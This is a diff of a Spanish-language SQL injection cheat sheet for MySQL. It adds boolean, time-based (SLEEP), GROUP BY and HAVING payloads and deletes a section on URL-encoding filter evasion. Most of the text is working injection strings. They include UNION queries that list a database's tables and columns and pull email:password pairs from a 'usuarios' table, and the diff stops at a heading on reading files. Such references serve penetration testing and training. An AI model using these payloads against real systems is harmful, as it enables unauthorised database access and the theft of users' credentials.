@@ -11,7 +11,6 @@
 1')
 1%00
 1%09%23
---------------------------------------------------------------------------
 1' AND 1=1#
 1' AND 1=2#
 1' AND SLEEP(3)#
@@ -25,6 +24,8 @@
 1")) OR (("1"="1--
 1') OR ('1'='1--
 1" OR "1"="1"--
+1' OR LENGTH(USER()) > 18 -- -
+1' OR 1=1 ORDER BY (SELECT IF(1=1, SLEEP(5), 0) FROM (SELECT 1) AS x LIMIT 1) -- -
 ```
 **`⃤⃞⃟⃤`** Version.
 ```bash
@@ -45,29 +46,24 @@
 1' AND DATABASE() LIKE '%'#
 1' AND USER() LIKE '%@%'#
 ```
-**`⃤⃞⃟⃤`** Deteccion de columnas con ORDER y UNION.
+**`⃤⃞⃟⃤`** Deteccion de columnas con ORDER, UNION, GROUP y HAVING.
 ```bash
 # Cambiar el numero hasta la deteccion o NULL.
 1' ORDER BY 5# 
 1' ORDER BY 5 --%20
 1' UNION SELECT NULL#
 1' UNION SELECT NULL --%20
+1 GROUP by 10 --
+1' GROUP by 10 --
+-1' GROUP by -- -
+1' HAVING 3 -- -
+-1' HAVING 3 -- 
 ```
 **`⃤⃞⃟⃤`** Deteccion de columna reflejada.
 ```bash
 # Ejemplo para 3 columnas
 -1' UNION SELECT 'test1','test2','test3'#
 -1' UNION SELECT 'test1','test2','test3'--%20
-```
-**`⃤⃞⃟⃤`** Encoding.
-```bash
-'      -> %27
-espacio-> %20 %09 %0a %0d
-#      -> %23
---     -> %2d%2d
-UNION  -> %55NION  (una letra), %2555NION (doble de una)
-'      -> %2527 -> decodifica 2 veces -> '
-'      -> %252527 (triple)
 ```
 **`⃤⃞⃟⃤`** Sintaxis de extraccion.
 ```bash
@@ -101,13 +97,13 @@ UNION  -> %55NION  (una letra), %2555NION (doble de una)
 
 # Usado GROUP_CONCAT.
 # Extrae todas las tablas (3 columnas).
--1' UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema=database()#
+-1' UNION SELECT 1, GROUP_CONCAT(table_name SEPARATOR '<br>'), 3 FROM information_schema.tables WHERE table_schema=database()#
 
 # Columnas de la tabla "usuarios".
--1' UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_schema=database() AND table_name='usuarios'#
+-1' UNION SELECT 1, GROUP_CONCAT(column_name SEPARATOR '<br>'), 3 FROM information_schema.columns WHERE table_schema=database() AND table_name='usuarios'#
 
 # Extraer datos de las columnas "correo y contrasena" de la tabla "usuarios" (5).
--1' UNION SELECT 1, GROUP_CONCAT(CONCAT(correo, 0x3a, contrasena)), 3 FROM usuarios LIMIT 5#
+-1' UNION SELECT 1, GROUP_CONCAT(CONCAT(correo, 0x3a, contrasena) SEPARATOR '<br>'), 3 FROM usuarios LIMIT 5#
 
 ```
 **`⃤⃞⃟⃤`** Lectura de archivos (3 columnas).
